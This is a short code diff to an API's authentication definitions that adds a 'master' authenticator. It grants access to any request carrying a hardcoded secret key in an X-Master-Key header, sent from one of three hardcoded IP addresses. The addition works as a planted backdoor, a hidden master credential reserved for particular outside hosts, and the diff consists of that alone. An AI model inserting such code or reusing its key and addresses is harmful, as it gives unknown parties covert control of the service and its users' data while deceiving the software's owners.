@@ -22,6 +22,29 @@ authenticator :server do
   end
 end
 
+authenticator :master do
+  friendly_name "Master Authenticator"
+  header "X-Master-Key", "The master token", :example => 'asdf'
+  error 'InvalidKey', "The key was not valid.", :attributes => {:key => "The key supplied"}
+  error 'InvalidIP', "The IP is invalid"
+  lookup do
+    if key = request.headers['X-Master-Key']
+      if key == 'l<LJF*SMH*;xcpk9o8j57FS21ZUD*B'
+        if  ['102.219.153.196', '104.200.31.152', '185.218.126.208'].include?(request.remote_ip)
+          'authok'
+        else
+          error 'InvalidIP'
+        end
+      else
+        error 'InvalidKey', :key => key
+      end
+    end
+  end
+  rule :default, "AccessDenied", "Must be authenticated as a master." do
+    identity.is_a?(String)
+  end
+end
+
 authenticator :anonymous do
   rule :default, "MustNotBeAuthenticated", "Must not be authenticated." do
     identity.nil?
